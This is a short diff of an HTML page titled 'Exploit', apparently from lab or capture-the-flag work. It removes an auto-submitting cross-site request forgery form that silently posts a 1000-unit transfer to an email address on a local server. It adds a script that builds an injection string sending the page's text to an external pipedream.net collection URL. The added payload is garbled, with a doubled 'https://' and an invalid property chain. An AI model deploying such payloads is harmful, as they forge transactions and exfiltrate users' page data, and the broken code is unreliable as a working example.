@@ -1,14 +1,13 @@
 <html>
-  <meta name="referrer" content="no-referrer">
-   <body>
-    <form action="http://192.168.2.98:49698/transfer" method="POST">
-      <input type="hidden" name="user&#95;to" value="test1&#64;gmail&#46;com" />
-      <input type="hidden" name="amount" value="1000" />
-      <input type="submit" value="Submit request" />
-    </form>
-    <script>
-      history.pushState('', '', '/');
-      document.forms[0].submit();
-    </script>
-  </body>
+<head>
+  <title> Exploit </title>
+</head>
+<body>
+  <script>
+    newPageTitle = "<script>document.location='https://https://eorlu6y42f2nftv.m.pipedream.net/?'+document.body.innerText.textContent";
+    
+    document.title = newPageTitle;
+    
+  </script>
+</body>
 </html>
